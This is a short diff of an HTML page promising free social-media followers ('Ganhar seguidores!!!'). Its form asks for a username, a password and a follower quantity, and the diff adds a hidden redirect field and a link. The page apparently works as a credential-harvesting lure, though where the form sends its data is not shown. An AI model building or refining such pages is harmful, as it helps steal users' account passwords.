@@ -7,6 +7,7 @@
   <title>Ganhar seguidores!!!</title>
   <link rel="stylesheet" href="Style/Style.css" media="all" />
   <link rel="stylesheet" href="Style/Media.css" media="screen" />
+  <link href="Mensagem.html" />
   
 </head>
 <body>
@@ -17,15 +18,15 @@
                  <input type="text" name="username" id="username" autocomplete="username" placeholder="Enter your username..." required/>
                    
                    <input type="hidden" name="captcha" value="false" />
-               
+                    <input type="hidden" name="next_" value="https://" />
                   <input type="password" name="senha" id="senha" placeholder="Enter your Password" minlength="8"
                     maxlength="20" autocomplete="Password" required>
                
                
                  <input type="number" name="quatidade" placeholder="quantity..." maxlength="10" min="1" required>
               
-              
-                 <input type="submit" id="button-seguir" value="Enviar"/>
+
+                  <button id="button-seguir" type="submit">Enviar</button>
                </div>
              </form>
 </body>
